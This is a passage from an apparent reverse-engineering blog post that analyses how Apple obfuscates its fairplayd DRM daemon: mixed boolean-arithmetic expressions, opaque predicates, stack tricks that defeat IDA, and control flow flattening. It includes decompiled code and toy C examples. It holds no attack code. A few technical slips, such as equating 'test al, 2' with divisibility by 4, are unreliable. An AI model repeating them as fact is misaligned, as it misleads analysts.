</span></span><span><span>((<span>void</span>(<span>__fastcall</span><span>*</span>)(<span>unsigned</span> <span>__int64</span> <span>*</span>))((<span>char</span><span>*</span>) <span>*</span>(<span>&amp;</span>off_1002B0BF0 <span>+</span>(<span>unsigned</span> <span>int</span>)(<span>unsigned</span> <span>__int8</span>)(byte_100237330[byte_1002AEDF0[(unsigned__int8) <span>&amp;</span>v297] <span>^</span> <span>0x18</span>] <span>^</span> (<span>unsigned</span> <span>__int8</span>) <span>&amp;</span>v297) <span>+</span>	<span>532</span>) <span>-</span><span>1051853286</span>))(<span>&amp;</span>v303);
</span></span><span><span><span>LODWORD</span>(v303) <span>=</span> <span>2064956458</span> <span>-</span> <span>1106503637</span> <span>*</span>(((<span>unsigned</span> <span>int</span>) <span>&amp;</span>v303 <span>-</span> <span>2</span> <span>*</span>((<span>unsigned</span> <span>int</span>) <span>&amp;</span>v303 <span>&amp;</span><span>0x6F01D10</span>) <span>+</span> <span>116399381</span>) <span>^</span> <span>0x92F4EBC6</span>);
</span></span><span><span><span>sub_10015D450</span>(<span>&amp;</span>v303);
</span></span><span><span>v21 <span>=</span> <span>HIDWORD</span>(v303);
</span></span><span><span>v22 <span>=</span> (<span>HIDWORD</span>(v303) <span>==</span> <span>1923298241</span>) <span>|</span> <span>2</span>;
</span></span></code></pre></div><p><strong>Panic</strong>! The analyst faced with such code has few choices: leave reverse engineering or try to investigate further. Most people applying obfuscation techniques hope that most of the time the analyst will choose the first path. If it is too complicated to analyze the behavior of an application by reverse engineering, it is not worth it. However, it is necessary for obfuscation to be well done before there can be any major slips. In this article we will try to find out that it actually only takes a simple look at the raw code to identify some common obfuscation patterns. In the next few paragraphs we will introduce some obfuscation techniques and how they are implemented.</p><p>Before continuing, we should mention that there are different obfuscation techniques depending on the resource to be protected. As we will see later, different obfuscation techniques have a different cost: the opaque predicate technique has an entirely different cost than control flow flattening. That said, let’s get started!</p><p><strong>Helpful Tip</strong>: With the presence of obfuscations applied to instructions and data, it is a good idea to try to use the decompiler view as little as possible. In fact, the decompiler deduces some high-level information from how the machine instructions were placed within the binary and what data they work on. Since most of the instructions are intended to complicate the decompiler result, abandoning the decompiler result is always a good idea.</p><h3 id="mixed-boolean-arithmetic-expression">Mixed Boolean Arithmetic Expression</h3><p>The first obfuscation technique we address is data obfuscation using mixed expressions with algebraic (sum, subtraction, multiplication, division) and boolean (logical operations) operators. These types of expressions are used when there is a need to hide a given numeric constant within a program. A constant datum could represent a value used in an encryption algorithm (<a href="https://en.wikipedia.org/wiki/Nothing-up-my-sleeve_number">“Nothing-up-my-sleeve-number”</a>), but also a string, a memory address, and more. But not only that! If during processing, such as during decryption, a cryptographic algorithm performs a simple addition, it is possible to make the arithmetic expression more complex.</p><p>Examples of arithmetic-boolean expressions are: <code>v298 &amp; 0x52491520 | (2 * (_DWORD) v298) &amp; 0x80120A40) ^ 0x40090520) + ((-1704077140 - (v298 &amp; 0x8924A850)) &amp; 0x8924A854) + ((((unsigned int) v298 &amp; 0x24924288) + 689062540) &amp;0x24924288 | (2 * v298) &amp; 0x506D9510)</code>. I have already written in a previous post <a href="https://nicolo.dev/blog/introduzione-pocket-offuscatore/">how to be able to create</a> these expressions by applying transformation rules. The process Apple used is the same: take a constant from the code, rewrite the constant using arithmetic operators, and then apply the transformations. Do we already have an expression? We continue to apply the rules of transformations. Note that only some transformations can be applied since they do not change the semantics of the original expression. At the end of the process, the expression is translated back into machine language so that it can be reinserted within the binary.</p><p>In the case of <code>fairplayd</code>, numeric constants most often represent addresses at which to jump from one basic block to another. Addresses refer to other basic blocks or to stubs used to call methods from other libraries. We will discuss this option in more detail in obfuscating the control flow.</p><p>We can actually see two types of obfuscation of Boolean expressions depending on the type of assembly instruction used. We can identify a classic example of obfuscation by a Boolean expression:</p><div><pre tabindex="0"><code data-lang="C"><span><span><span>*</span>(_BYTE <span>*</span>)(a1 <span>+</span> v2) <span>=</span> <span>-</span><span>13</span> <span>*</span> (<span>-</span><span>71</span> <span>*</span> (<span>59</span> <span>*</span> <span>*</span>(_BYTE <span>*</span>)(a1 <span>+</span> v2) <span>-</span> <span>107</span>) <span>+</span> <span>71</span> <span>*</span> (v2 <span>&amp;</span> <span>0xF</span> <span>^</span> <span>0x9C</span>)) <span>-</span> <span>111</span>;
</span></span></code></pre></div><p>This in assembly is translated as:</p><div><pre tabindex="0"><code data-lang="asm"><span><span><span>cdqe</span>
</span></span><span><span><span>movzx</span>   <span>ecx</span>, <span>byte</span> <span>ptr</span> [<span>rdi</span><span>+</span><span>rax</span>]
</span></span><span><span><span>imul</span>    <span>ecx</span>, <span>0x3B</span>
</span></span><span><span><span>add</span>     <span>cl</span>, <span>0x95</span>
</span></span><span><span><span>movzx</span>   <span>ecx</span>, <span>cl</span>
</span></span><span><span><span>imul</span>    <span>ecx</span>, <span>0xB9</span>
</span></span><span><span><span>mov</span>     <span>edx</span>, <span>eax</span>
</span></span><span><span><span>and</span>     <span>edx</span>, <span>0x0F</span>
</span></span><span><span><span>xor</span>     <span>edx</span>, <span>0x9C</span>
</span></span><span><span><span>imul</span>    <span>edx</span>, <span>0x47</span>
</span></span><span><span><span>add</span>     <span>edx</span>, <span>ecx</span>
</span></span><span><span><span>imul</span>    <span>ecx</span>, <span>edx</span>, <span>0x0D</span>
</span></span><span><span><span>add</span>     <span>cl</span>, <span>0x91</span>
</span></span><span><span><span>mov</span>     [<span>rdi</span><span>+</span><span>rax</span>], <span>cl</span>
</span></span></code></pre></div><p>We note that these assembly instructions are quite common to find within the Intel x86_64 instruction set, and with a little effort it is possible to reduce the expression to a simplified expression through some framework, such as <a href="https://github.com/mrphrazer/msynth">Msynth</a>. These instructions are also classified historically as SISD: a single expression acting on a single data item (the sum between the <code>cl</code> and <code>0x95</code> registers has no side effects on the other registers).</p><p>Another type of logical arithmetic expression that I have currently found involves another type of instruction. The Intel x86_64 instruction set uses a subsystem called MMX that is part of the SIMD (Single Instruction, Multiple Data) family of instructions and allows a single instruction to operate on multiple data. For example, a basic block of these instructions are:</p><div><pre tabindex="0"><code data-lang="asm"><span><span><span>movdqu</span>  	<span>xmm0</span>, <span>xmmword</span> <span>ptr</span> [<span>rdi</span><span>+</span><span>rdx</span>]
</span></span><span><span><span>pmovzxbw</span> 	<span>xmm3</span>, <span>xmm0</span>
</span></span><span><span><span>punpckhbw</span> 	<span>xmm0</span>, <span>xmm0</span>
</span></span><span><span><span>movdqa</span>  	<span>xmm1</span>, <span>cs</span>:<span>xmmword_100216450</span>
</span></span><span><span><span>pmullw</span>  	<span>xmm0</span>, <span>xmm1</span>
</span></span><span><span><span>pand</span>    	<span>xmm0</span>, <span>xmm6</span>
</span></span><span><span><span>pmullw</span>  	<span>xmm3</span>, <span>xmm1</span>
</span></span><span><span><span>pand</span>    	<span>xmm3</span>, <span>xmm6</span>
</span></span><span><span><span>packuswb</span> 	<span>xmm3</span>, <span>xmm0</span>
</span></span><span><span><span>paddb</span>   	<span>xmm3</span>, <span>cs</span>:<span>xmmword_100216470</span>
</span></span><span><span><span>pshufd</span>  	<span>xmm0</span>, <span>xmm3</span>, <span>0</span><span>EEh</span>
</span></span><span><span><span>pmovzxbd</span> 	<span>xmm8</span>, <span>xmm0</span>
</span></span><span><span><span>pshufd</span>  	<span>xmm0</span>, <span>xmm3</span>, <span>0</span><span>FFh</span>
</span></span><span><span><span>pmovzxbd</span> 	<span>xmm13</span>, <span>xmm0</span>
</span></span><span><span><span>pshufd</span>  	<span>xmm0</span>, <span>xmm3</span>, <span>55</span><span>h</span> <span>; 'U'
</span></span></span><span><span><span></span><span>pmovzxbd</span> 	<span>xmm9</span>, <span>xmm0</span>
</span></span><span><span><span>pmovzxbd</span> 	<span>xmm10</span>, <span>xmm3</span>
</span></span><span><span><span>movdqa</span>  	<span>xmm0</span>, <span>cs</span>:<span>xmmword_100216600</span>
</span></span><span><span><span>pmulld</span>  	<span>xmm10</span>, <span>xmm0</span>
</span></span><span><span><span>pmulld</span>  	<span>xmm9</span>, <span>xmm0</span>
</span></span><span><span><span>pmulld</span>  	<span>xmm13</span>, <span>xmm0</span>
</span></span><span><span><span>pmulld</span>  	<span>xmm8</span>, <span>xmm0</span>
</span></span><span><span><span>movdqa</span>  	<span>xmm0</span>, <span>xmm14</span>
</span></span><span><span><span>movdqa</span>  	<span>xmm4</span>, <span>cs</span>:<span>xmmword_100216480</span>
</span></span><span><span><span>pand</span>    	<span>xmm0</span>, <span>xmm4</span>
</span></span></code></pre></div><p>These kinds of operations are complex to translate into high-level code because they are dependent on the architecture and on whether one instruction can be converted into multiple high-level instructions (for example: paddb allows 128-bit addition between the xmm3 register and the data located at address xmmword_100216470). IDA solves this problem by defining functions such as <code>mmu_addb(xmm3, xmmword_100216470)</code> but we do not know, however, what happens inside.</p><p><strong>Idea</strong>: SIMD computation opens a number of opportunities for obfuscation based on MBA expressions: is it possible to use technology for <a href="https://developer.apple.com/documentation/accelerate">matrix computation</a>/parallel to obfuscate a certain constant? The idea would be to have a series of MBA expressions to compute in parallel to find the result of a constant. This would lower the overhead given by introducing the complication of an expression (and since I have a lower overhead, I can increase the degree of illegibility of the expression). Plus it would be dependent on the Apple Silicon architecture, making it more difficult to emulate the computation. Possible problems with this approach include: finding equations that can be executed in parallel, checking how to interact with parallel cores (via software abstraction?), checking the semantics of expressions.</p><p>The technique of obfuscation by mixed boolean arithmetic expressions has been widely used in the <code>fairplayd</code> binary. An excellent example of how this obfuscation has been used can be found in the function <a href="https://gist.github.com/seekbytes/696f71ec49b7e75728e94f5bea4dee46">sub_1001F5D32</a>: the largest function within which Boolean arithmetic expressions are found. There are currently several methods for trying to summarize arithmetic Boolean expressions, but most rely on a single technique called <strong>symbolic execution</strong> and involve the use of Proof Solvers such as z3 to verify the semantics between the obfuscated expression and the synthesized expression.</p><p>The best tool you can currently use to solve arithmetic Boolean expressions is <a href="https://github.com/HexRaysSA/goomba/">goomba</a>, developed by HexRays and available by default in IDA Pro and IDA Teams versions 8.3. An excellent alternative is the <a href="https://github.com/mrphrazer/msynth">Msynth</a> framework developed by <a href="https://synthesis.to/">Tim Blazytko</a>, which succeeds well. Ultimately, while MBA obfuscation is a good alternative for making expressions more complicated, there are many tools for solving and rewriting expressions.</p><h3 id="opaque-predicates">Opaque Predicates</h3><p>Opaque predicates are another very “cheap” technique for introducing obfuscation within instructions. This technique consists of introducing some always true or always false conditions that cause the decompiler to explore blocks of instructions with zero utility. The always true or always false conditions include a direct or indirect jump to basic blocks that will never be executed: they do not present additional functionality, they only add complexity to the functions being analyzed.</p><p>Assume, for example, that we have the following source code:</p><div><pre tabindex="0"><code data-lang="C"><span><span><span>int</span> <span>sum</span>(<span>int</span> a, <span>int</span> b){
</span></span><span><span>	<span>int</span> result <span>=</span> a <span>+</span> b <span>+</span> c;
</span></span><span><span>	<span>return</span> result;
</span></span><span><span>}
</span></span></code></pre></div><p>To protect the given part of the result we can rewrite the code like this:</p><div><pre tabindex="0"><code data-lang="C"><span><span><span>int</span> <span>sum</span>(<span>int</span> a, <span>int</span> b){
</span></span><span><span>	<span>int</span> result <span>=</span> a <span>+</span> b;
</span></span><span><span>
</span></span><span><span>	<span>if</span>(a <span>==</span> <span>0</span> <span>&amp;&amp;</span> a <span>==</span> <span>1</span> <span>&amp;&amp;</span> a <span>-</span> <span>4</span> <span>&gt;=</span> <span>55</span> <span>&amp;&amp;</span> (a <span>*</span> <span>4</span> <span>-</span> <span>36</span> <span>*</span> <span>0xff</span> <span>-</span> <span>0xc</span>) <span>&lt;</span> <span>2</span>){
</span></span><span><span>		result <span>+=</span> <span>1</span> <span>*</span> <span>4</span> <span>&lt;&lt;</span> <span>2</span> <span>-</span> <span>0x5c</span>;
</span></span><span><span>	} <span>else</span> <span>if</span> (a <span>==</span> <span>5</span> <span>&amp;&amp;</span> a <span>!=</span> <span>5</span>){
</span></span><span><span>		<span>if</span>(b <span>&gt;</span> <span>4</span> <span>&amp;&amp;</span> b <span>&lt;</span> <span>4</span> <span>&amp;&amp;</span> b <span>!=</span> <span>4</span> <span>&amp;&amp;</span> <span>352610</span> <span>==</span> <span>122</span>){
</span></span><span><span>			result <span>+=</span> <span>50</span> <span>*</span> <span>0xf5</span> <span>*</span> <span>352610</span>;
</span></span><span><span>			result <span>+=</span> <span>decrypt</span>(key);
</span></span><span><span>		}
</span></span><span><span>	} <span>else</span> {
</span></span><span><span>		<span>return</span> result <span>+</span> <span>decrypt</span>(key);
</span></span><span><span>	}
</span></span><span><span>}
</span></span></code></pre></div><p>To our amazement we will find that the decompiler would struggle to reconstruct the original check, so it would miss some always true or always false checks. The defense given by these opaque predicates is proportional to the degree of illegibility and complexity given by the check made between the (high-level) ifs or the various algebraic arithmetic statements given before the <code>cmp</code> statement. Code within the ifs is presented as <em>dead code</em> i.e., code that will never be executed: during decompilation, however, it is not possible to recognize between code that will run and dead code. Opaque predicates therefore add degrees of “confusion” to binary analysis.</p><p>A typical example of this transformation is the procedure <code>sub_100005FC0</code>: after the classical prologue, we can find a function call and then two different execution branches. The condition to jump into a branch or continue is given by the <code>test al, 2</code> instruction: at high level the condition would be equal to <code>if (al % 4 == 0)</code>, i.e. if the number stored inside register <code>al</code> is divisible by 4 continue with the execution, otherwise jump to <code>loc_10000505F</code>. The <code>test</code> instruction actually performs AND between the register <code>al</code> and the immediate value <code>0x2</code>: performing an AND with an immediate value means checking the remainder of the register division with the immediate value <code>al &amp; 2 == al % 4</code>.</p><p>Visualizing the graph tree of the function we can see how the basic block just below the condition is a very large block.</p><p><img src="https://nicolo.dev/images/blog/fairplay/ida-graph-tree.png" alt="Fuction Graph tree on IDA"></p><p>Intuitively one would think that a very large basic block would be an integral part of the processing. If the program were not obfuscated, this is a very real assumption. However, we have to imagine that Apple’s developers have complicated the instructions precisely in order to challenge the automatic binary analysis tools. In this case, the largest basic block (TRUE branch of the condition <code>at % 4 == 0</code>) represents a clear example of <strong>opaque predicate</strong>. In fact, if we saw the most substantial elementary block, we could see a number of useless assembly operations.</p><p><img src="https://nicolo.dev/images/blog/fairplay/ida-basic-block-huge.png" alt="Graph tree on IDA"></p><p>Note that the screenshot has been cropped to avoid filling the entire article with the image of the basic block. We ask: Is it exactly a basic block that is useless for computation purposes? Is the condition <code>al % 4 == 0</code> always true or always false? The job of obfuscation would be to prevent any kind of inference within the condition. And it is: we cannot predict whether the instruction will always have a constant result or not.</p><p>What we can do, however, is to see the basic block present below the basic block of the TRUE condition <code>al % 4 == 0</code>. The basic block we are looking at then represents the FALSE condition (i.e. following <code>jnz loc_100005F2F</code>, we come to analyze the condition <code>loc_100005F2F</code>). A good way to check whether the largest basic block is actually useful or not is to see if there are any dependencies between the data used in the suspect basic block and the other basic blocks.</p><p>In this case, we can see that the basic block loads the address of xmmword_1002B6460, which was previously used in the “suspect” basic block.</p><p><img src="https://nicolo.dev/images/blog/fairplay/ida-block-10005f2f.png" alt="Basic block, false condition of if instruction"></p><p>In the suspect basic block, the memory location <code>xmmword_1002B6460</code> is rewritten by an information present in another memory location. It is therefore difficult to verify the complex dependency between the instructions! However in this case, it is easy to check the dependency since the most “important” code for this function can be translated like this:</p><div><pre tabindex="0"><code data-lang="C"><span><span>xmmword_1002B5460 <span>=</span> <span>0x0EC0C7C941423B0F77D59F9E25CFAC016</span>;
</span></span><span><span>xmmword_1002142F0 <span>=</span> <span>0x6432B8A1D491C1746754EB00EF0F9478</span>;
</span></span><span><span>
</span></span><span><span><span>// prologo
</span></span></span><span><span><span></span>[... omissis ...]
</span></span><span><span><span>// eax = 
</span></span></span><span><span><span></span><span>if</span> (al <span>%</span> <span>4</span> <span>==</span> <span>0</span>){
</span></span><span><span>	<span>// dead code
</span></span></span><span><span><span></span>	xmmword_1002B5460 <span>=</span> xmmword_1002142F0;
</span></span><span><span>}
</span></span><span><span><span>memcpy</span>(v6, <span>&amp;</span>xmmword_1002B5460, <span>0x1000</span>);
</span></span><span><span>
</span></span><span><span><span>// epilogo
</span></span></span></code></pre></div><p>What is the value of the variable <code>xmmword_1002B5460</code>? Much depends on the condition of the if. However, even in uncertainty, the obfuscation given by the opaque predicate turns out to be not very powerful: we have two choices, this means that we can propagate most of the changes in a parallel way (verifying what happens if we enter the TRUE condition block or inside to block the FALSE condition). Other questions that might come to mind:</p><ul><li><p>how are we sure that the assembly code of the largest basic block is composed of “dead code”? The instructions currently show that other data is overwritten, but that data is never used. The question remains open on other procedures that could use this data (even if the analysis of the references has not highlighted this possibility, we cannot trust 100% of the binary analysis tools).</p></li><li><p>how do we make sure that <code>xmmword_1002142F0</code> is not overwritten by other functions? As usual, we use the powerful XREF tool: there are no other procedures that read/write the memory of <code>xmmword_1002142F0</code>. But remember that XREF checks based on information gleaned from automated binary analysis tools. Even just one piece of information lost during the initial parsing can cause major headaches at the end of the parse (ie during reference scanning).</p></li><li><p>how can we be sure that the condition <code>al % 4 == 0</code> is not always satisfied? We could only answer this question when we have invented the crystal ball. What matters to us is not so much verifying whether the condition is true or false: we actually want to carry out an analysis of the data to understand the effects of the “suspect” basic block of being dead code. To verify this, we carried out an analysis on the basic block immediately following the suspected block. If we are in doubt, as in this case, we can also propagate the changes to the following blocks to see if in one way or another we can infer some other data.</p></li></ul><p>To answer the question “so what does <code>sub_100005FC0</code> do in practice?”, just look at the basic block just after the <code>memcpy</code> function call. Let us remember that the signature (that is the declaration of the function) is the following: <code>sub_100005FC0(int64 a1, int a2)</code>.</p><div><pre tabindex="0"><code data-lang="C"><span><span><span>for</span> ( i <span>=</span> <span>0</span>; i <span>!=</span> a2; <span>++</span>i ){
</span></span><span><span>	v4 <span>=</span> i <span>+</span> <span>15</span>;
</span></span><span><span>	<span>if</span> ( i <span>&gt;=</span> <span>0</span> )
</span></span><span><span>		v4 <span>=</span> i;
</span></span><span><span>
</span></span><span><span>	<span>*</span>(_BYTE <span>*</span>)(a1 <span>+</span> i) <span>=</span> <span>-</span><span>13</span> <span>*</span> v6[<span>256</span> <span>*</span> (<span>__int64</span>)(<span>int</span>)(i <span>-</span> (v4 <span>&amp;</span> <span>0xFFFFFFF0</span>))
</span></span><span><span>	 	<span>+</span> (<span>unsigned</span> <span>__int8</span>)(<span>59</span> <span>*</span> <span>*</span>(_BYTE <span>*</span>)(a1 <span>+</span> i) <span>-</span> <span>107</span>)] <span>-</span> <span>111</span>;
</span></span><span><span>}
</span></span></code></pre></div><p>The <code>sub_100005FC0</code> procedure then proceeds to iterate over the v6 buffer to deobfuscate the contents of the word <code>xmmword_1002B5460</code>. The most expensive instruction, computationally speaking, is an MBA expression to be deobfuscated. Please refer to the MBA subsection to understand how to deobfuscate the expression and rewrite it. If you have problems with pointers, I can rewrite the expression as:</p><pre tabindex="0"><code>a1[i] = -13 * v6[256 * (i - (v4 &amp; 0xFFFFFFF0)) + 59 * a1[i] - 107] - 111;
</code></pre><p>The obfuscation measure in this case is <strong>not effective</strong> and allows you to recover much of the original information. There are numerous cases of the tendency to include “useless” opaque predicates (like this one discussed) within the <code>fairplayd</code> program. The opaque predicates introduced by Apple don’t give you a headache: a good software analyst would be able to distinguish between dead branches and instructions that cannot be executed. Apple needs to review the construction of the opaque predicates to make the basic blocks even more complex.</p><p><strong>Idea</strong>: To make obfuscation even more effective, you would need to make each elementary block more complex (perhaps trying to make the control flow more complicated). A clear example of how hard the decompiler’s job can be made is presented in the subsection <strong>control flow flattening</strong>.</p><h3 id="moving-the-stack">Moving the stack</h3><p>Before continuing with our discussion, let’s stick with the analysis of the <code>sub_100005FC0</code> function and display the prologue of the procedure before the <code>test al, 0x2</code> statement.</p><p><img src="https://nicolo.dev/images/blog/fairplay/ida-sub-4220.png" alt="Screen of prologue of sub_100005FC0"></p><p>Do we notice anything strange? I confess that it was not easy to analyze, but after the analysis of IDA we understand another “obfuscation” technique that Apple has applied to protect <code>fairplayd</code>. Very subtly the stack is moved up (or down, depending on how you want to build the stack). Why would a program want to move the stack?</p><p>All instruction analysis software provides, among the many analysis steps, a particular type of insight called “stack analysis”. This technique allows you to recover how the stack and local variables are composed: it is essential to be able to correctly deduce how the stack is composed, otherwise the analysis software is no longer able to understand the flow control and the various function calls.</p><p>For this procedure, the type of error that IDA reports is <code>sp-analysis failed</code> i.e. it fails to trace how the stack pointer is modified. In our case, IDA fails to realize that the shift is done precisely to confuse the analysis. Indeed with the instruction <code>mov eax, 1010h</code> and <code>sub rsp, rax</code><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup>, IDA is led to think that there is a local buffer called <code>var_1020</code> of size 0x1010 bytes. This is just one of many examples where IDA fails to rebuild the original stack.</p><p>Other examples can be found in functions with multiple statements: the procedure <code>sub_10000F620</code> has a parameter on the stack that occupies 0x2CE7AB73 bytes (753380211 bytes = about 753 MB). Such a large parameter on the stack we know cannot exist: the stack can be increased in size, but usually reaches <strong>maximum</strong> 65520kb (higher values cause errors in macOS). The value 753 MB is given by an basic block in which the <code>sub esp, 0x2CE7AB73</code> instruction is used, an unreachable basic block, therefore considered dead code. However, IDA does not have the tools to realize that such a value is too large to exist: IDA does not recognize that its analysis is inaccurate, on the contrary it refuses to decompile the function because the size of the stack frame is too large. With a single instruction, Apple manages to put a major barrier to anyone who wants to decompile the feature.</p><p>Is it so difficult to fix this situation? For a beginner, yes. For a motivated reverse engineering student, no. Fortunately, IDA allows the analyst to be able to modify part of the information that he has deduced. By redefining the stack, much of the 753MB of variable can be ignored. An alternative way is to report a certain path as dead code (just select the bytes of that block and not define it via the option called <em>Undefine</em>). In the case of moving the stack pointer up, when we try to make software analysis complex, we’re not really talking about obfuscation: we’re not affecting the readability of the code. Rather, let’s act on some limitations that these tools have to recover information. A good article grouping some techniques to confuse the analysis techniques applied by IDA was written by Markus Gaasedelen: <a href="https://blog.ret2.io/2017/11/16/dangers-of-the-decompiler/">Dangers of the Decompiler</a>.</p><h3 id="control-flow-flattening">Control Flow Flattening</h3><p>Control Flow Flattening is another obfuscation technique found within the FairPlay binary and is perhaps the most powerful used by Apple in the field of code protection for <code>fairplayd</code>. Flow control indicates how the program evolves over time in terms of instruction flow. What functions a procedure calls, what kind of jumps the check makes (if conditional or unconditional), the link between the various basic blocks, the conditions for which the execution moves and many other information are inferred from the flow control.</p><p>The high-level instructions of flow control are the typical instructions that allow you to divide the execution of a program into one or more cases: <code>if</code>, <code>if else</code>, <code>if else if else</code>, <code>switch</code>, <code>do while</code>, <code>for</code> and many others. Most of these conditions translate into machine language instructions which for Intel become <code>cmp</code>, <code>test</code>, <code>jmp</code>. If the high-level flow control change is dictated by “logical” instructions, the low-level flow control change is to change the address of the next instruction, or rather, jump to a certain instruction.</p><p>Among the information that we can deduce from the flow control, we can derive the various connections between the basic blocks and proceed to carry out the intra-procedural analysis, i.e. try to reconstruct the program execution flow between the various procedures. The flow of control also allows to recover important information (such as loops) to subsequently proceed to the translation from machine code to pseudo C code.</p><p>To more clearly show the power of obfuscation using control flow flattening, let’s take an example function: <code>sub_10003FE60</code>. From IDA, we select the example function, right click and choose the tree view. The tree view is a feature of IDA which allows you to understand: how the basic blocks are connected, the dependencies between the blocks and the execution branches. Often through this view it is possible to get a better idea of what the pseudo code translated by the decompiler will look like.</p><p>The goal of the control flow flattening technique is to flatten the control flow, i.e. to transform the control flow through some conditional and unconditional jumps. The technique was developed by <a href="https://www.darkreading.com/edge-articles/chenxi-wang-from-security-research-to-developing-the-next-generation-of-security-leaders">Chenxi Wang</a> in his doctoral thesis entitled <em>A Security Architecture for Survivability Mechanisms</em>. Normally the control flow of a procedure is almost developed vertically, as you can see in the image below.</p><p><img src="https://nicolo.dev/images/blog/fairplay/ida-vertical.png" alt="IDA vertical control flow"></p><p>With the application of control flow flattening, the procedure graph is heavily modified by making it “more horizontal,” that is, flattened or <em>flatten</em>. Here is a typical example of how a function can be modified by applying (simple) control flow flattening:</p><p><img src="https://nicolo.dev/images/blog/fairplay/control-flow-flattening.png" alt="IDA control flow after applying the control flow flattening"></p><p>We can then see how the basic blocks have all been brought to the same de facto level by horizontally extending the graph of basic blocks. The case of control flow flattening taken to the extreme drives the analyst crazy, such as this function depicted below:</p><p><img src="https://nicolo.dev/images/blog/fairplay/ida-extreme.png" alt="IDA vertical control flow extreme"></p><p>As can be seen from the image just above, control flow flattening can be applied to construct even bogus basic blocks that can confuse the decompiler. The end result is a control flow that is extremely complex to analyze. At a high level, the transformation technique can be translated by a simple switch. Suppose we have a procedure:</p><div><pre tabindex="0"><code data-lang="C"><span><span><span>int</span> <span>sum</span>(<span>int</span> a, <span>int</span> b){
</span></span><span><span>	<span>int</span> s <span>=</span> <span>4</span>;
</span></span><span><span>	<span>int</span> c;
</span></span><span><span>	<span>if</span> ( a <span>&gt;</span> <span>500</span> ){
</span></span><span><span>		c <span>=</span> <span>2</span>;
</span></span><span><span>	} <span>else</span> {
</span></span><span><span>		c <span>=</span> <span>0</span>;
</span></span><span><span>	}
</span></span><span><span>	<span>int</span> result <span>=</span> s <span>+</span> a <span>+</span> b <span>+</span> c;
</span></span><span><span>	<span>return</span> result;
</span></span><span><span>}
</span></span></code></pre></div><p>The control flow of this simple function is given by the following graph:</p><p><img src="https://nicolo.dev/images/blog/fairplay/cff-before.svg" alt="Control flow graph"></p><p>Now we want this vertical graph to be as flattened as possible! To do this we use another powerful construct of programming languages: the <code>switch</code> instruction. The <code>switch</code> instruction allows the execution to be divided into multiple branches, creating basic blocks arranged horizontally. To switch from one branch to another in the switch, however, we can use an auxiliary variable, called <code>state</code>, which stores the current state we are in. Does this sound familiar? This technique sounds a lot like the synthesis of a finite state machine! The auxiliary variable helps to change state without worrying about some side effects (or without the use of labels and goto). Let us then move on to the actual transformation! For now, let us assume that we do not add any unnecessary basic blocks.</p><p>The steps we perform are as follows:</p><ol><li><p><strong>Creation of the “start”</strong> block: contains the initialization of the state variable and all the variables that will be used within the basic blocks of the switch. It is possible to move the declarations within the switch branches, however, we must pay attention to possible side effects of using local variables internal to a construct.</p></li><li><p><strong>Dispatcher creation</strong>: This basic block will check what state to jump to. It is a simple <code>while</code> with a switch statement inside: this is to avoid that after entering one of the switch branches, the jump out reaches the last statement of the function.</p></li><li><p><strong>Move basic blocks</strong>: I choose a new number for a new state. I insert the code within the identified basic block including the state change. The state variable should point to the next basic block I want to execute. I remind you that I can also create new elementary blocks by subdividing larger basic blocks or adding instructions that will never be executed. The limit for obfuscation is imagination :- )</p></li><li><p><strong>Transformation check</strong>: I check that indeed the function can terminate, paying attention to the last block that is executed. All transformations of obfuscations should actually be checked through some proof solvers and mathematical equations to prevent the original semantics from being changed during the obfuscation process.</p></li></ol><p>Applying control flow flattening:</p><div><pre tabindex="0"><code data-lang="C"><span><span><span>int</span> <span>sum</span>(<span>int</span> a, <span>int</span> b){
</span></span><span><span>	<span>int</span> state <span>=</span> <span>0</span>;
</span></span><span><span>	<span>int</span> s, c, result;
</span></span><span><span>	<span>while</span>(<span>1</span>){
</span></span><span><span>		<span>switch</span>(state){
</span></span><span><span>			<span>case</span> <span>2</span><span>:</span>
</span></span><span><span>				<span>if</span> (a <span>&gt;</span> <span>500</span>){
</span></span><span><span>					state <span>=</span> <span>4</span>;
</span></span><span><span>				} <span>else</span> {
</span></span><span><span>					state <span>=</span> <span>-</span><span>1</span>;
</span></span><span><span>				}
</span></span><span><span>				<span>break</span>;
</span></span><span><span>			<span>case</span> <span>0</span><span>:</span>
</span></span><span><span>				s <span>=</span> <span>4</span>;
</span></span><span><span>				state <span>=</span> <span>2</span>;
</span></span><span><span>				<span>break</span>;
</span></span><span><span>			<span>case</span> <span>-</span><span>1</span><span>:</span>
</span></span><span><span>				c <span>=</span> <span>0</span>;
</span></span><span><span>				state <span>=</span> <span>5</span>;
</span></span><span><span>				<span>break</span>;
</span></span><span><span>			<span>case</span> <span>5</span><span>:</span>
</span></span><span><span>				result <span>=</span> s <span>+</span> a <span>+</span> b <span>+</span> c;
</span></span><span><span>			<span>case</span> <span>0x54292639</span><span>:</span>
</span></span><span><span>				<span>return</span> result;
</span></span><span><span>			<span>case</span> <span>4</span><span>:</span>
</span></span><span><span>				c <span>=</span> <span>2</span>;
</span></span><span><span>				state <span>=</span> <span>5</span>;
</span></span><span><span>				<span>break</span>;
</span></span><span><span>		}
</span></span><span><span>	}
</span></span><span><span>	<span>return</span> <span>-</span><span>542926392</span>;
</span></span><span><span>}
</span></span></code></pre></div><p>The result:</p><p><img src="https://nicolo.dev/images/blog/fairplay/cff-after.svg" alt="Control flow graph"></p><p>Some notes we write per point:</p><ul><li><p>the graph does not contain the while instruction to avoid adding too many arrows and making the graph more confusing. When a branch of a switch ends with the <code>break</code> instruction, execution resumes from the evaluation of the <code>state</code> variable. The graph does not contain the last instruction <code>return -542926392;</code>, it should be inserted with an arrow after dispatcher execution.</p></li><li><p><code>basic block A</code> and <code>basic block B</code> are two basic blocks that were inserted to highlight the difference in the control flow whether the variable <code>a</code> results in greater than 500 or not. If indeed the condition is true, we change state by going to state 4, otherwise we go to state -1. Note that the number for each state is trivially a number chosen at random to identify each state with a label.</p></li><li><p>An attacker could still predict the instruction execution flow by following the evolution of the <code>state</code> variable. There are some gimmicks to obfuscate the value of the <code>state</code> variable such as using MBA expressions and aliasing. It is also possible to introduce unnecessary blocks, opaque predicates and dynamically construct the switch to divert the analyst or hinder the decompiler’s analysis.</p></li><li><p>the variable <code>state</code> is never assigned with the value <code>0x54292639</code>. So how do we ensure that the function terminates by returning <code>result</code>? In the previous code we used a small stratagem: we take advantage of not mentioning <code>break</code> within the switch branch. In this case, execution goes immediately from state <code>5</code> to state <code>0x54292639</code> because the program is executed sequentially (shown as “<strong>C Magic</strong>”). Sometimes it is possible that the compiler applies optimizations to not create the branch of 0x54292639, so be sure to disable the optimizations if you want the graph to be the same as the image above.</p></li></ul><p>Just out of curiosity, let’s try 